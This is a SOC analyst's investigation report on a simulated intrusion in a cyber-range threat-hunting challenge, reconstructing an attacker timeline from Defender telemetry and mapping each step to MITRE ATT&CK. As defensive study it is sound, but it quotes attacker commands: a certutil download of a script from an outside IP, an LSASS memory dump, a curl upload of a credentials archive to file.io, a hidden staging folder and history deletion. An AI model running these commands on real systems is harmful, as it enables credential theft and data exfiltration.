# SOC Incident Investigation – Azuki Import/Export Compromise

**Analyst:** Steven Cruz  
**Source:** Cyber Range SOC Challenge  
**System:** azuki-fileserver01

---

## Overview
This investigation analyzes a simulated intrusion against Azuki Import/Export (梓貿易株式会社) as part of the Cargo Hold threat-hunting exercise in the Azuki Breach Saga.
The scenario provides participants with Microsoft Defender for Endpoint (MDE) telemetry from a compromised environment,
requiring analysts to identify attacker actions across the kill chain—from initial access to exfiltration and anti-forensics.

## Scenario Context
Attackers initially gained access to an Azuki workstation on November 19, establishing a foothold before going dormant for approximately 72 hours.
Upon returning, they conducted lateral movement toward high-value assets, staged data for exfiltration, deployed persistence mechanisms, and attempted to remove forensic evidence.

## Data Sources
All findings were derived exclusively from Microsoft Defender for Endpoint Advanced Hunting logs, including:

- DeviceProcessEvents

- DeviceFileEvents

- DeviceLogonEvents

- DeviceRegistryEvents

- DeviceNetworkEvents

No host access, file content review, or endpoint imaging was required; all conclusions were driven by log-based hunting and correlation.

## Scope of Investigation
The objective of this hunt was to:

- Identify attacker behaviors mapped to MITRE ATT&CK

- Validate compromised accounts, hosts, staging directories, toolsets, and exfiltration channels

- Interpret attacker methodology based solely on MDE telemetry

- Produce high-confidence answers for each step of the adversary workflow

This report documents each phase of the intrusion and the analytical steps taken to identify the Indicators of Compromise (IOCs) and behavioral patterns used throughout the attack.

---

## TIMELINE OF ATTACKER ACTIVITY

This timeline consolidates attacker behaviors observed across MDE telemetry. Each entry represents a confirmed activity tied to a specific phase of the intrusion.

🛬 Initial Access & Return Activity
Timestamp	System	Account	Action	IOC
Nov 19, 2025 7:10:42 PM	azuki-fileserver01	fileadmin	LogonSuccess	Pivot from azuki-sl (RemoteIP 10.10.1.204)
Nov 22, 2025 12:27:53 AM	azuki-sl	kenji.sato	LogonSuccess	Return from external source 159.26.106.98

TTP: Initial Access → Return Infrastructure (MITRE TA0001)

🚚 Lateral Movement to High-Value Assets
Timestamp	System	Account	Action	IOC
Nov 22, 2025 12:11:14 AM	azuki-fileserver01	fileadmin	LogonSuccess	Compromised admin account used from 10.0.8.4

TTP: Remote Services (MITRE T1021)

🔎 Discovery Phase
Timestamp	Command	Technique
12:40:54 AM	net share	Local Share Enumeration
12:42:01 AM	net view \\10.1.0.188	Remote Share Enumeration
12:40:09 AM	whoami /all	Privilege Discovery
12:42:46 AM	ipconfig /all	Network Configuration Discovery

System + Account: azuki-fileserver01 — fileadmin
TTPs: T1083, T1135, T1033, T1016

🕵️‍♂️ Defense Evasion
Timestamp	Command	Purpose
12:55:43 AM	attrib +h +s C:\Windows\Logs\CBS	Hiding staging directory

Device: azuki-fileserver01
TTP: Hidden Files & Directories (T1564.001)

📥 Ingress Tool Transfer
Timestamp	Command	Payload
12:58:24 AM	certutil -urlcache -f http://78.141.196.6:67331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1	PS1 downloader tool

Device: azuki-fileserver01 — fileadmin
TTP: Ingress Tool Transfer (T1105)

📂 Collection & Data Staging
Timestamp	Command	Source → Destination
1:06:03 AM	xcopy C:\FileShares\Financial C:\Windows\Logs\CBS\financial /E /I /H /Y	Sensitive file share → staging directory
1:07:53 AM	Created file	IT-Admin-Passwords.csv

TTPs: Automated Collection (T1119)
Indicators: Data aggregation in hidden CBS folder

🗜️ Compression of Stolen Data
Timestamp	Command	Output
1:25:31 AM	tar -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .	GZIP archive created

TTP: Archive via Utility (T1560.001)

🧩 Credential Access
Timestamp	Event	Output File
~2:24:47 AM	pd -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp	lsass.dmp dump created

TTP: OS Credential Dumping (T1003.001)

☁️ Exfiltration
Timestamp	Command	Destination
2:06:08 AM	curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io	External cloud service file.io

TTP: Exfiltration to Cloud Storage (T1567.002)

♻️ Persistence
Timestamp	Registry Modification	Beacon
(Timestamp from RegistryEvent Query E)	Created Run key → FileShareSync	Launches svchost.ps1

TTP: Registry Run Keys (T1547.001)

🧹 Anti-Forensics Cleanup
Timestamp	File Deleted	Why
2:26:01 AM	ConsoleHost_history.txt	Removed PowerShell command evidence

TTP: Clear Command History (T1070.003)
